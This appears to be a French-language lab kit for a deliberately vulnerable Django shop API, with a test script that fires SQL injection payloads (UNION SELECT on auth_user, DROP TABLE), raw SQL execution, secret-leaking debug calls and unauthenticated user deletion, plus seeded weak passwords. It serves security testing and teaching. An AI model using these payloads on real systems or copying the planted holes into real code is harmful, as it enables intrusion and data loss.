# ===== test_vulnerabilities.py =====
"""
Script pour tester les vulnérabilités de l'API UrbanTendance
Usage: python test_vulnerabilities.py
"""

import requests
import json

BASE_URL = "http://localhost:8000/api"

class UrbanTendanceVulnTest:
    def __init__(self):
        self.base_url = BASE_URL
        self.token = None
    
    def test_login(self):
        """Test de connexion"""
        print("🔑 Test de connexion...")
        
        url = f"{self.base_url}/auth/login/"
        data = {"username": "admin", "password": "admin123"}
        
        response = requests.post(url, json=data)
        print(f"Status: {response.status_code}")
        
        if response.status_code == 200:
            result = response.json()
            self.token = result.get('token')
            print(f"✅ Connexion réussie! Token: {self.token[:20]}...")
            print(f"👤 Utilisateur: {result['user']['username']}")
            return True
        else:
            print(f"❌ Échec de connexion: {response.text}")
            return False
    
    def test_admin_stats(self):
        """Test des statistiques admin"""
        print("\n📊 Test des statistiques admin...")
        
        url = f"{self.base_url}/admin/stats/"
        response = requests.get(url)
        
        print(f"Status: {response.status_code}")
        if response.status_code == 200:
            stats = response.json()
            print(f"✅ Statistiques récupérées:")
            print(f"   👥 Utilisateurs: {stats.get('total_users', 0)}")
            print(f"   🛒 Commandes: {stats.get('total_orders', 0)}")
            print(f"   📦 Produits: {stats.get('total_products', 0)}")
            print(f"   💰 Revenus: {stats.get('total_revenue', 0)} FCFA")
            
            # FAILLE: Informations sensibles exposées
            if 'system_info' in stats:
                print(f"🚨 FAILLE - Infos système exposées:")
                print(f"   Secret key: {stats['system_info'].get('secret_key', 'N/A')}")
                print(f"   Debug mode: {stats['system_info'].get('debug_mode', 'N/A')}")
        else:
            print(f"❌ Erreur: {response.text}")
    
    def test_sql_injection_search(self):
        """Test d'injection SQL via la recherche"""
        print("\n💉 Test d'injection SQL...")
        
        # Payloads d'injection SQL
        payloads = [
            "admin' OR '1'='1",
            "' UNION SELECT id,username,password,email FROM auth_user--",
            "'; DROP TABLE auth_user; --"
        ]
        
        for payload in payloads:
            print(f"\n🎯 Test payload: {payload}")
            url = f"{self.base_url}/admin/users/search/"
            
            response = requests.get(url, params={'q': payload})
            print(f"Status: {response.status_code}")
            
            if response.status_code == 200:
                result = response.json()
                if 'users' in result and result['users']:
                    print(f"⚠️  VULNÉRABLE! {len(result['users'])} utilisateurs exposés")
                    # Afficher le premier résultat (sans les mots de passe complets)
                    if result['users']:
                        user = result['users'][0]
                        print(f"   Exemple: {user.get('username', 'N/A')} - {user.get('email', 'N/A')}")
                else:
                    print("✅ Aucun résultat (potentiellement protégé)")
            else:
                print(f"❌ Erreur: {response.text}")
    
    def test_direct_sql_execution(self):
        """Test d'exécution SQL directe"""
        print("\n💣 Test d'exécution SQL directe...")
        
        queries = [
            "SELECT COUNT(*) as total_users FROM auth_user;",
            "SELECT username, email FROM auth_user LIMIT 3;",
            "SELECT name FROM sqlite_master WHERE type='table';",
            # Requête dangereuse (commentée pour la sécurité)
            # "UPDATE auth_user SET is_staff=1 WHERE username='test';"
        ]
        
        for query in queries:
            print(f"\n🔍 Exécution: {query}")
            url = f"{self.base_url}/admin/execute-sql/"
            data = {"query": query}
            
            response = requests.post(url, json=data)
            print(f"Status: {response.status_code}")
            
            if response.status_code == 200:
                result = response.json()
                if result.get('success'):
                    print(f"🚨 CRITIQUE! Requête SQL exécutée avec succès!")
                    if 'results' in result:
                        print(f"   Résultats: {len(result['results'])} lignes")
                        if result['results']:
                            print(f"   Premier résultat: {result['results'][0]}")
                else:
                    print(f"❌ Échec: {result.get('error', 'Erreur inconnue')}")
            else:
                print(f"❌ Erreur HTTP: {response.text}")
    
    def test_debug_endpoint(self):
        """Test de l'endpoint de debug"""
        print("\n🔍 Test de l'endpoint de debug...")
        
        url = f"{self.base_url}/debug/"
        response = requests.get(url)
        
        print(f"Status: {response.status_code}")
        if response.status_code == 200:
            debug_info = response.json()
            print("🚨 CRITIQUE! Informations sensibles exposées:")
            
            if 'database_info' in debug_info:
                db_info = debug_info['database_info']
                print(f"   🗄️  DB User: {db_info.get('user', 'N/A')}")
                print(f"   🔑 DB Password: {db_info.get('password', 'N/A')}")
                print(f"   🏠 DB Host: {db_info.get('host', 'N/A')}")
            
            if 'server_info' in debug_info:
                server_info = debug_info['server_info']
                print(f"   🔐 Secret Key: {server_info.get('secret_key', 'N/A')}")
                print(f"   🐛 Debug Mode: {server_info.get('debug_mode', 'N/A')}")
            
            if 'security_status' in debug_info:
                security = debug_info['security_status']
                print(f"   ⚠️  Vulnérabilités: {security.get('vulnerability_count', 'N/A')}")
                print(f"   🚨 Critiques: {security.get('critical_vulnerabilities', 'N/A')}")
        else:
            print(f"❌ Erreur: {response.text}")
    
    def test_user_deletion(self):
        """Test de suppression d'utilisateur sans autorisation"""
        print("\n🗑️  Test de suppression d'utilisateur...")
        
        # D'abord, récupérer la liste des utilisateurs
        url = f"{self.base_url}/admin/users/"
        response = requests.get(url)
        
        if response.status_code == 200:
            users = response.json().get('users', [])
            if users:
                # Trouver un utilisateur non-admin à supprimer
                target_user = None
                for user in users:
                    if not user.get('is_superuser') and user.get('username') != 'admin':
                        target_user = user
                        break
                
                if target_user:
                    print(f"🎯 Tentative de suppression de: {target_user['username']}")
                    delete_url = f"{self.base_url}/admin/users/{target_user['id']}/delete/"
                    
                    response = requests.delete(delete_url)
                    print(f"Status: {response.status_code}")
                    
                    if response.status_code == 200:
                        result = response.json()
                        print(f"⚠️  VULNÉRABLE! Utilisateur supprimé sans autorisation!")
                        print(f"   Message: {result.get('message', 'N/A')}")
                    else:
                        print(f"✅ Suppression refusée: {response.text}")
                else:
                    print("ℹ️  Aucun utilisateur non-admin trouvé pour le test")
            else:
                print("❌ Aucun utilisateur trouvé")
        else:
            print(f"❌ Erreur lors de la récupération des utilisateurs: {response.text}")
    
    def create_test_data(self):
        """Créer des données de test"""
        print("\n🏗️  Création de données de test...")
        
        url = f"{self.base_url}/create-test-data/"
        response = requests.post(url)
        
        print(f"Status: {response.status_code}")
        if response.status_code == 200:
            result = response.json()
            print(f"✅ Données créées avec succès!")
            print(f"   Produits créés: {len(result.get('created_products', []))}")
            print(f"   Total produits: {result.get('total_products', 0)}")
            print(f"   Total commandes: {result.get('total_orders', 0)}")
        else:
            print(f"❌ Erreur: {response.text}")
    
    def run_all_tests(self):
        """Exécuter tous les tests de vulnérabilités"""
        print("🚀 DÉBUT DES TESTS DE VULNÉRABILITÉS URBANTENDANCE")
        print("=" * 60)
        
        # Créer des données de test d'abord
        self.create_test_data()
        
        # Tester la connexion (optionnel)
        # self.test_login()
        
        # Tests des vulnérabilités
        self.test_admin_stats()
        self.test_sql_injection_search()
        self.test_direct_sql_execution()
        self.test_debug_endpoint()
        self.test_user_deletion()
        
        print("\n" + "=" * 60)
        print("🏁 TESTS TERMINÉS")
        print("\n⚠️  VULNÉRABILITÉS DÉTECTÉES:")
        print("1. 🔓 Accès admin sans authentification")
        print("2. 💉 Injection SQL dans la recherche")
        print("3. 💣 Exécution SQL directe autorisée")
        print("4. 🔍 Endpoint de debug exposé")
        print("5. 🗑️  Suppression d'utilisateurs sans autorisation")
        print("6. 📊 Exposition d'informations sensibles")
        print("7. 🚫 CSRF désactivé")
        print("8. 🌐 CORS trop permissif")

if __name__ == "__main__":
    tester = UrbanTendanceVulnTest()
    tester.run_all_tests()

# ============================================
# MANAGEMENT COMMAND POUR CRÉER DES DONNÉES
# ============================================

# ===== ./api/management/__init__.py =====
# Fichier vide

# ===== ./api/management/commands/__init__.py =====
# Fichier vide

# ===== ./api/management/commands/setup_urbantendance.py =====
from django.core.management.base import BaseCommand
from django.contrib.auth.models import User
from products.models import Category, Product
from orders.models import Order
from django.utils.text import slugify
from decimal import Decimal
import uuid
import random

class Command(BaseCommand):
    help = 'Configure UrbanTendance avec des données de test'

    def handle(self, *args, **options):
        self.stdout.write('🚀 Configuration de UrbanTendance...')
        
        # Créer les utilisateurs
        self.create_users()
        
        # Créer les catégories et produits
        self.create_products()
        
        # Créer quelques commandes
        self.create_orders()
        
        self.stdout.write(
            self.style.SUCCESS('✅ UrbanTendance configuré avec succès!')
        )
        
        self.stdout.write('\n🔐 COMPTES CRÉÉS:')
        self.stdout.write('   Admin: admin / admin123')
        self.stdout.write('   User:  test / test123')
        
        self.stdout.write('\n🌐 ENDPOINTS DISPONIBLES:')
        self.stdout.write('   http://localhost:8000/api/admin/stats/')
        self.stdout.write('   http://localhost:8000/api/admin/users/')
        self.stdout.write('   http://localhost:8000/api/debug/')
        
        self.stdout.write('\n⚠️  VULNÉRABILITÉS ACTIVES:')
        self.stdout.write('   - Injection SQL dans la recherche')
        self.stdout.write('   - Exécution SQL directe')
        self.stdout.write('   - Informations sensibles exposées')
        self.stdout.write('   - Contrôle d\'accès faible')

    def create_users(self):
        # Admin
        admin, created = User.objects.get_or_create(
            username='admin',
            defaults={
                'email': 'admin@urbantendance.com',
                'is_staff': True,
                'is_superuser': True,
                'first_name': 'Admin',
                'last_name': 'UrbanTendance'
            }
        )
        if created:
            admin.set_password('admin123')
            admin.save()
            self.stdout.write('✅ Admin créé')

        # Utilisateur test
        user, created = User.objects.get_or_create(
            username='test',
            defaults={
                'email': 'test@urbantendance.com',
                'first_name': 'Test',
                'last_name': 'User'
            }
        )
        if created:
            user.set_password('test123')
            user.save()
            self.stdout.write('✅ Utilisateur test créé')

    def create_products(self):
        # Catégories
        categories_data = [
            'Vêtements Homme', 'Vêtements Femme', 'Chaussures', 
            'Accessoires', 'Sport'
        ]
        
        categories = {}
        for cat_name in categories_data:
            category, created = Category.objects.get_or_create(
                name=cat_name,
                defaults={
                    'slug': slugify(cat_name),
                    'description': f'Collection {cat_name}',
                    'is_active': True
                }
            )
            categories[cat_name] = category

        # Produits
        products_data = [
            ('T-Shirt Premium', 'Vêtements Homme', 25000),
            ('Jean Slim', 'Vêtements Homme', 45000),
            ('Robe Été', 'Vêtements Femme', 38000),
            ('Sneakers Urban', 'Chaussures', 85000),
            ('Sac à Dos', 'Accessoires', 45000),
            ('Legging Sport', 'Sport', 35000),
        ]
        
        for name, cat_name, price in products_data:
            product, created = Product.objects.get_or_create(
                name=name,
                defaults={
                    'slug': slugify(name),
                    'description': f'{name} - Qualité premium',
                    'price': Decimal(str(price)),
                    'category': categories[cat_name],
                    'stock': random.randint(10, 50),
                    'brand': 'UrbanStyle',
                    'is_active': True
                }
            )
            if created:
                self.stdout.write(f'✅ Produit créé: {name}')

    def create_orders(self):
        users = User.objects.filter(is_staff=False)
        if users.exists():
            for i in range(3):
                user = random.choice(users)
                Order.objects.create(
                    user=user,
                    order_number=f'UT{uuid.uuid4().hex[:8].upper()}',
                    status='completed',
                    subtotal=Decimal('50000'),
                    total_amount=Decimal('50000'),
                    shipping_address={'city': 'Yaoundé'},
                    billing_address={'city': 'Yaoundé'}
                )
            self.stdout.write('✅ Commandes de test créées')

# ============================================
# INSTRUCTIONS DE DÉPLOIEMENT
# ============================================

deployment_instructions = '''
🚀 INSTRUCTIONS DE DÉPLOIEMENT URBANTENDANCE

1. STRUCTURE DES FICHIERS:
   urbantendance/
   ├── api/
   │   ├── __init__.py
   │   ├── apps.py
   │   ├── views.py (copier depuis l'artifact)
   │   ├── urls.py (copier depuis l'artifact)
   │   └── management/
   │       ├── __init__.py
   │       └── commands/
   │           ├── __init__.py
   │           └── setup_urbantendance.py
   ├── products/ (existant)
   ├── orders/ (existant)
   ├── users/ (existant)
   ├── reviews/ (existant)
   └── urbantendance/
       ├── settings.py (mis à jour)
       └── urls.py (mis à jour)

2. COMMANDES D'INSTALLATION:
   pip install django djangorestframework django-cors-headers django-filter

3. CONFIGURATION:
   - Ajouter 'api' dans INSTALLED_APPS
   - Modifier urls.py principal
   - Appliquer les migrations

4. INITIALISATION:
   python manage.py makemigrations
   python manage.py migrate
   python manage.py setup_urbantendance

5. DÉMARRAGE:
   python manage.py runserver localhost:8000

6. TESTS:
   python test_vulnerabilities.py

🎯 ENDPOINTS VULNÉRABLES:
- GET  /api/admin/stats/ (stats sans auth)
- GET  /api/admin/users/ (liste users)  
- GET  /api/admin/users/search/?q=PAYLOAD (SQL injection)
- POST /api/admin/execute-sql/ (SQL direct)
- GET  /api/debug/ (infos sensibles)
- DELETE /api/admin/users/ID/ (suppression sans auth)

⚠️  VULNÉRABILITÉS INCLUSES:
✓ Injection SQL
✓ Exécution SQL directe  
✓ Contrôle d'accès faible
✓ Exposition d'informations sensibles
✓ CSRF désactivé
✓ Debug mode activé
✓ CORS permissif
✓ Logs sensibles exposés
'''

print(deployment_instructions)










# ============================================
# MISE À JOUR DU URLS.PY PRINCIPAL
# ============================================

# Ajouter cette ligne dans ./urbantendance/urls.py :
# path('api/', include('api.urls')),

# ============================================
# MISE À JOUR SETTINGS.PY
# ============================================

# Ajouter 'api' dans INSTALLED_APPS dans settings.py

# ============================================
# COMMANDES POUR DÉMARRER
# ============================================

"""
1. Créer le dossier api/ et ses fichiers :
   mkdir api
   touch api/__init__.py
   touch api/apps.py
   # Copier le contenu de views.py et urls.py ci-dessus

2. Ajouter 'api' dans INSTALLED_APPS dans settings.py

3. Ajouter dans urbantendance/urls.py :
   path('api/', include('api.urls')),

4. Appliquer les migrations :
   python manage.py makemigrations
   python manage.py migrate

5. Créer des données de test :
   POST http://localhost:8000/api/create-test-data/

6. Lancer le serveur :
   python manage.py runserver localhost:8000

7. Tester les endpoints vulnérables :
   - POST http://localhost:8000/api/auth/login/
   - GET http://localhost:8000/api/admin/stats/
   - GET http://localhost:8000/api/admin/users/
   - GET http://localhost:8000/api/admin/users/search/?q=' OR 1=1 --
   - POST http://localhost:8000/api/admin/execute-sql/
   - GET http://localhost:8000/api/debug/
"""